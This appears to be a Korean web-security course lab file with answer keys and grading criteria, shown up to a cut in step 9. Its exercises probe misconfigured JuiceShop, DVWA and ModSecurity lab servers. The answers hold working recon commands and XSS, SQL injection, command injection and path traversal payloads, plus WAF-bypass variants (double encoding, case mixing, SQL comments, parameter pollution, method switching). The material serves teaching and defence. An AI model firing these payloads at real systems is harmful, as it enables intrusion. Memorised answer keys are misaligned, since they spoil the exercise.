lab_id: web-vuln-nonai-week14
title: 보안 설정 오류 실습
version: non-ai
course: web-vuln-nonai
week: 14
description: 웹 서버, 애플리케이션, WAF의 보안 설정 오류를 탐지하고, ModSecurity 우회 기법을 통해 설정 강화의 필요성을 실습합니다.
difficulty: hard
duration_minutes: 120
objectives:
- 웹 서버와 애플리케이션의 보안 설정 오류를 탐지한다
- 디폴트 설정, 불필요한 기능 노출, 에러 정보 유출 등의 위험을 분석한다
- ModSecurity WAF 우회 기법을 학습하고 방어를 강화한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: nikto를 사용하여 대상 웹 서버({{WEB_IP}}:3000)의 보안 설정을 스캔하시오. 기본 설정 문제, 불필요한 파일 노출 등을 탐지하라.
  hint: nikto -h http://{{WEB_IP}}:3000 -maxtime 30 형태로 실행하세요.
  category: recon
  points: 8
  answer: nikto -h http://10.20.30.80:3000 -maxtime 30 2>/dev/null | head -30
  answer_detail: nikto는 웹 서버의 알려진 취약점, 설정 오류, 기본 파일 등을 자동으로 스캔합니다. Server 헤더 정보 노출, 디렉터리 리스팅, 기본 파일(phpinfo.php,
    .htaccess), HTTP 메서드 설정 등을 확인합니다.
  verify:
    type: output_regex
    expect: nikto|Nikto
    field: stdout
    semantic:
      intent: nikto 스캔 — nikto -h http://10.20.30.80:3000 -maxtime 30. 알려진 취약점/설정 오류/기본 파일/디렉터리 리스팅/HTTP
        메서드 자동 탐지. OWASP A05. 웹 스캐너 표준.
      success_criteria:
      - nikto 또는 Nikto 키워드
      - nikto -h URL
      - -maxtime 제한
      acceptable_methods:
      - nikto -h
      - OWASP ZAP active scan
      - wapiti 자동
      negative_signs:
      - nikto 없음
      - -maxtime 없음
      - 단순 curl
  target_vm: attacker
- order: 2
  instruction: 각 포트(80, 3000, 8080)의 Server 헤더 정보 노출을 확인하시오. 서버 종류, 버전, 프레임워크 정보가 응답 헤더에 노출되는지 확인하라.
  hint: curl -sI로 각 포트의 응답 헤더를 확인하세요. Server, X-Powered-By 등의 헤더를 검사합니다.
  category: recon
  points: 8
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): echo ''=== Port 80 (Apache+ModSecurity) ==='' && curl -sI http://10.20.30.80:80 | grep
    -iE ''(server|x-powered|x-aspnet)'' && echo ''=== Port 3000 (JuiceShop) ==='' && curl -sI http://10.20.30.80:3000
    | grep -iE ''(server|x-powered|x-aspnet)'' && echo ''=== Port 8080 (DVWA) ==='' && curl -sI http://10.20.30.80:8080
    | grep -iE ''(server|x-powered|x-aspnet)'''
  answer_detail: Server 헤더에 소프트웨어 이름과 버전이 노출되면 공격자가 해당 버전의 알려진 CVE를 검색할 수 있습니다. Apache는 ServerTokens Prod,
    Nginx는 server_tokens off로 최소 정보만 노출해야 합니다. X-Powered-By 헤더는 완전히 제거해야 합니다.
  verify:
    type: output_contains
    expect: Server
    field: stdout
    semantic:
      intent: Server 헤더 노출 — curl -sI + grep '(server|x-powered|x-aspnet)' × 3 포트 (80/3000/8080). CVE
        매칭. ServerTokens Prod + X-Powered-By 제거. OWASP A05 + CWE-200.
      success_criteria:
      - Server 키워드
      - 3 포트 검증
      - 헤더 그립
      acceptable_methods:
      - curl -sI + grep
      - whatweb 자동
      - wafw00f
      negative_signs:
      - 포트 1개
      - Server 헤더 누락
      - CVE 맥락 없음
  target_vm: attacker
- order: 3
  instruction: 디렉터리 리스팅(Directory Listing)이 활성화된 경로를 찾으시오. JuiceShop의 /ftp/, /assets/, /encryptionkeys/
    등을 확인하라.
  hint: curl로 각 디렉터리에 접근하여 파일 목록이 표시되는지 확인하세요.
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): echo ''=== Directory Listing Check ==='' && for DIR in ftp assets encryptionkeys public;
    do echo -n "/$DIR/: " && RESP=$(curl -s http://10.20.30.80:3000/$DIR/ | head -c 200) && if echo "$RESP"
    | grep -qi ''href\|listing\|index of''; then echo ''EXPOSED''; else echo "HTTP $(curl -s -o /dev/null
    -w ''%{http_code}'' http://10.20.30.80:3000/$DIR/)"; fi; done && echo ''=== Dir Listing Check Complete
    ==='''
  answer_detail: 디렉터리 리스팅이 활성화되면 백업 파일, 설정 파일, 소스코드 등이 노출됩니다. JuiceShop의 /ftp/ 디렉터리에는 package.json.bak,
    쿠폰 파일 등이 노출되어 있습니다. Apache는 Options -Indexes로 비활성화합니다.
  verify:
    type: output_contains
    expect: Dir Listing Check Complete
    field: stdout
    semantic:
      intent: 디렉터리 리스팅 — for DIR in ftp assets encryptionkeys public; curl + grep 'href|listing|index
        of'. JuiceShop /ftp/ 백업 파일 노출. Apache Options -Indexes. OWASP A05.
      success_criteria:
      - Dir Listing Check Complete 키워드
      - 다중 디렉터리 (4개 이상)
      - EXPOSED 또는 HTTP 코드
      acceptable_methods:
      - for + curl + grep
      - dirb/gobuster
      - ffuf -w
      negative_signs:
      - 디렉터리 2개 이하
      - 단순 curl
      - 리스팅 검증 없음
  target_vm: attacker
- order: 4
  instruction: 민감 파일 노출을 확인하시오. 백업 파일(.bak), 설정 파일(.env), VCS 디렉터리(.git), 소스맵(.map) 등이 웹에서 접근 가능한지 테스트하라.
  hint: curl로 /.git/config, /.env, /robots.txt, /package.json, /main.js.map, /ftp/package.json.bak 등에
    접근하세요.
  category: exploit
  points: 12
  answer: 'echo ''=== Sensitive File Scan ==='' && for FILE in .git/config .env .htaccess robots.txt package.json
    main.js.map ftp/package.json.bak ftp/coupons_2013.md.bak ftp/eastere.gg; do SIZE=$(curl -s -o /dev/null
    -w ''%{size_download}'' http://10.20.30.80:3000/$FILE 2>/dev/null); CODE=$(curl -s -o /dev/null -w
    ''%{http_code}'' http://10.20.30.80:3000/$FILE 2>/dev/null); echo "/$FILE: HTTP $CODE ($SIZE bytes)";
    done && echo ''=== Sensitive File Scan Complete ==='''
  answer_detail: package.json은 의존성 정보(버전 포함)를 노출하여 알려진 취약점(CVE)을 매칭할 수 있습니다. .bak 파일에는 이전 설정이나 쿠폰 코드가
    남아있을 수 있습니다. .git/config가 노출되면 git-dumper로 전체 소스코드를 복원할 수 있습니다.
  verify:
    type: output_contains
    expect: Sensitive File Scan Complete
    field: stdout
    semantic:
      intent: 민감 파일 노출 — for FILE in .git/config .env .htaccess package.json main.js.map ftp/*.bak; curl
        + size/code. .git/config → git-dumper 소스 복원. .env → DB 비밀번호. package.json → CVE 매칭. OWASP A05
        + CWE-200.
      success_criteria:
      - Sensitive File Scan Complete 키워드
      - 민감 파일 5개 이상
      - 크기/코드 분석
      acceptable_methods:
      - for + curl + size
      - gitdumper + nuclei
      - dirsearch --ext
      negative_signs:
      - 파일 3개 이하
      - 크기 미점검
      - 소스 복원 맥락 없음
  target_vm: attacker
- order: 5
  instruction: 에러 메시지를 통한 정보 노출을 확인하시오. 의도적으로 에러를 유발하여 스택 트레이스, 데이터베이스 정보, 파일 경로 등이 노출되는지 테스트하라.
  hint: 잘못된 SQL 구문, 존재하지 않는 API 경로, 잘못된 파라미터 타입 등으로 에러를 유발하세요.
  category: exploit
  points: 12
  answer: echo '=== Error Information Leak ===' && echo '[SQL Error]' && curl -s 'http://10.20.30.80:3000/rest/products/search?q=test%27'
    | head -c 300 && echo '' && echo '[Invalid API]' && curl -s http://10.20.30.80:3000/api/Nonexistent/
    | head -c 200 && echo '' && echo '[Type Error]' && curl -s 'http://10.20.30.80:3000/api/Products/abc'
    | head -c 200 && echo '' && echo '=== Error Leak Check Complete ==='
  answer_detail: 상세한 에러 메시지는 데이터베이스 종류(SQLite, MySQL), 테이블 구조, 파일 시스템 경로, 프레임워크 버전 등을 노출합니다. 프로덕션에서는 일반적인
    에러 페이지만 표시하고 상세 로그는 서버 내부에만 기록해야 합니다.
  verify:
    type: output_contains
    expect: Error Leak Check Complete
    field: stdout
    semantic:
      intent: 에러 정보 노출 — SQL 에러(test') + 미존재 API(/api/Nonexistent/) + 타입 에러(/api/Products/abc). 스택 트레이스/DB
        종류/경로 노출 → NODE_ENV=production. CWE-209.
      success_criteria:
      - Error Leak Check Complete 키워드
      - 에러 유발 3종 (SQL/404/type)
      - 응답 분석
      acceptable_methods:
      - 수동 에러 유발
      - Burp Intruder 타입
      - OWASP ZAP fuzz
      negative_signs:
      - 에러 1종 이하
      - 단순 GET
      - 정보 노출 맥락 없음
  target_vm: attacker
- order: 6
  instruction: ModSecurity WAF의 존재를 탐지하고, 알려진 공격 패이로드를 포트 80으로 전송하여 차단 동작을 확인하시오.
  hint: XSS(<script>alert(1)</script>), SQLi(' OR 1=1--), Command Injection(;cat /etc/passwd), Path Traversal(../../../etc/passwd)
    페이로드를 포트 80에 전송하세요.
  category: exploit
  points: 12
  answer: echo '=== WAF Detection Test ===' && echo -n '[XSS] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}'
    'http://10.20.30.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E' && echo '' && echo -n '[SQLi] ' && curl
    -s -o /dev/null -w 'HTTP:%{http_code}' "http://10.20.30.80:80/?id=1'+OR+1=1--" && echo '' && echo
    -n '[CMDi] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?cmd=;cat+/etc/passwd'
    && echo '' && echo -n '[LFI] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/../../etc/passwd'
    && echo '' && echo '=== WAF Detection Complete ==='
  answer_detail: ModSecurity는 OWASP Core Rule Set(CRS)을 사용하여 공격 패턴을 탐지합니다. 403이 반환되면 WAF가 차단한 것입니다. 모든
    공격 유형에 대해 403이 나와야 정상입니다. 200이 나오면 해당 공격 유형의 룰이 미적용된 것입니다.
  verify:
    type: output_contains
    expect: WAF Detection Complete
    field: stdout
    semantic:
      intent: WAF 탐지 — XSS/SQLi/CMDi/LFI 4종 페이로드 포트 80 전송. 403 = WAF 차단. ModSecurity OWASP CRS. 403/200
        응답 비교. 각 공격 유형별 룰 적용 검증. MITRE T1036.
      success_criteria:
      - WAF Detection Complete 키워드
      - 4종 공격 (XSS/SQLi/CMDi/LFI)
      - HTTP 코드 분석
      acceptable_methods:
      - curl 4종 페이로드
      - wafw00f 자동
      - Burp Scanner
      negative_signs:
      - 공격 2종 이하
      - 403 검증 없음
      - WAF 맥락 없음
  target_vm: attacker
- order: 7
  instruction: WAF 우회를 위한 인코딩 기법을 테스트하시오. URL 이중 인코딩, 대소문자 혼합, SQL 주석 삽입으로 XSS/SQLi 차단을 우회하라.
  hint: <script>를 %253Cscript%253E(이중 인코딩), <ScRiPt>(대소문자 혼합), UNION/**/SELECT(SQL 주석) 등으로 변환하세요.
  category: exploit
  points: 12
  answer: echo '=== WAF Bypass Techniques ===' && echo -n '[Normal XSS - blocked] ' && curl -s -o /dev/null
    -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%3Cscript%3Ealert(1)%3C/script%3E' && echo '' &&
    echo -n '[Double Encoded] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%253Cscript%253Ealert(1)%253C/script%253E'
    && echo '' && echo -n '[Mixed Case] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?q=%3CScRiPt%3Ealert(1)%3C/ScRiPt%3E'
    && echo '' && echo -n '[SQL Comment] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?id=1+UNION/**/SELECT/**/1,2,3'
    && echo '' && echo -n '[HPP] ' && curl -s -o /dev/null -w 'HTTP:%{http_code}' 'http://10.20.30.80:80/?id=1&id=OR+1%3D1--'
    && echo '' && echo '=== Bypass Test Complete ==='
  answer_detail: 이중 인코딩은 WAF가 한 번 디코딩 후 패턴 매칭하지만, 백엔드가 다시 디코딩하여 공격이 성공하는 기법입니다. OWASP CRS 3.x는 재귀적 디코딩과
    대소문자 무시 매칭으로 대부분 방어합니다. WAF는 만능이 아니므로 서버 측 입력 검증을 병행해야 합니다.
  verify:
    type: output_contains
    expect: Bypass Test Complete
    field: stdout
    semantic:
      intent: WAF 우회 — 이중 인코딩(%253C) + 대소문자(ScRiPt) + SQL 주석(UNION/**/SELECT) + HPP(id=1&id=OR 1=1). CRS
        3.x 재귀 디코딩 + (?i) 대응. WAF는 만능 X → 서버 검증 필수. CWE-20.
      success_criteria:
      - Bypass Test Complete 키워드
      - 우회 기법 4종 이상
      - 각 응답 코드
      acceptable_methods:
      - 이중 인코딩 + 변형
      - wfuzz payload processing
      - Burp Intruder + 변형
      negative_signs:
      - 우회 2종 이하
      - HPP 맥락 없음
      - 이중 인코딩 누락
  target_vm: attacker
- order: 8
  instruction: HTTP 메서드 변조와 Content-Type 변경으로 WAF를 우회하시오. GET 대신 PUT/PATCH, JSON 대신 multipart로 같은 공격 페이로드를
    전송하라.
  hint: 'curl -X PUT, curl -X PATCH 등으로 메서드를 변경하고, Content-Type: multipart/form-data로 페이로드를 전송하세요.'
  category: exploit
  points: 10
  answer: 'PAYLOAD="id=1''+OR+1=1--" && echo ''=== HTTP Method Bypass ==='' && for METHOD in GET POST
    PUT PATCH; do echo -n "[$METHOD] " && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X $METHOD -d
    "$PAYLOAD" http://10.20.30.80:80/ && echo ''''; done && echo ''=== Content-Type Bypass ==='' && echo
    -n ''[JSON] '' && curl -s -o /dev/null -w ''HTTP:%{http_code}'' -X POST http://10.20.30.80:80/ -H
    ''Content-Type: application/json'' -d ''{"id":"1 OR 1=1--"}'' && echo '''' && echo ''=== Method Bypass
    Test Complete ==='''
  answer_detail: 일부 WAF 규칙은 특정 HTTP 메서드(GET/POST)에만 적용됩니다. PUT이나 PATCH로 같은 페이로드를 보내면 규칙이 매칭되지 않아 우회될 수
    있습니다. WAF 규칙은 모든 HTTP 메서드에 적용되어야 합니다.
  verify:
    type: output_contains
    expect: Method Bypass Test Complete
    field: stdout
    semantic:
      intent: '메서드 + CT 우회 — for METHOD in GET POST PUT PATCH; curl -X $METHOD + Content-Type: application/json
        vs multipart. 특정 메서드에만 룰 적용 시 PUT/PATCH 우회. 모든 메서드 룰 적용 필수. CWE-20.'
      success_criteria:
      - Method Bypass Test Complete 키워드
      - 4 메서드 + CT 변경
      - 응답 코드 비교
      acceptable_methods:
      - for + curl -X + -H CT
      - Burp Intruder Method list
      - postman method 스윕
      negative_signs:
      - 메서드 2개 이하
      - CT 미변경
      - 우회 맥락 없음
  target_vm: attacker
- order: 9
  instruction: CORS 설정 오류를 확인하시오. Origin 헤더를 evil.com으로 설정하여 크로스 도메인 접근이 허용되는지 테스트하라.
  hint: 'curl -H ''Origin: http://evil.com'' 으로 요청하고, Access-Control-Allow-Origin 응답 헤더를 확인하세요.'
  category: exploit
  points: 10
  answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속

    📎 참고 (CLI): echo ''=== CORS Misconfiguration Test ==='' && echo ''[JuiceShop - evil.com]'' && curl
    -sI http://10.20.30.80:3000/api/Products/ -H ''Origin: http://evil.com'' | grep -i access-control
    && echo ''[JuiceShop - null origin]'' && curl -sI http://10.20.30.80:3000/api/Products/ -H ''Origin:
    null'' | grep -i access-control && echo ''[DVWA - evil.com]'' && curl -sI http://10.20.30.80:8080/
    -H ''Origin: http://evil.com'' | grep -i access-control || echo ''No CORS headers'' && echo ''===
    CORS Test Complete ==='''
  answer_detail: Access-Control-Allow-Origin이 요청의 Origin을 그대로 반영하거나 *이면, 모든 도메인에서 API를 호출할 수 있습니다. 공격자의
    악성 사이트에서 JavaScript로 API를 호출하여 인증된 사용자의 데이터를 탈취할 수 있습니다.
  verify:
    type: output_contains
    expect: CORS Test Complete
    field: stdout
    semantic:
      intent: 'CORS 오류 — curl -H ''Origin: http://evil.com'' + -H ''Origin: null'' + DVWA 별도 검증. ACAO
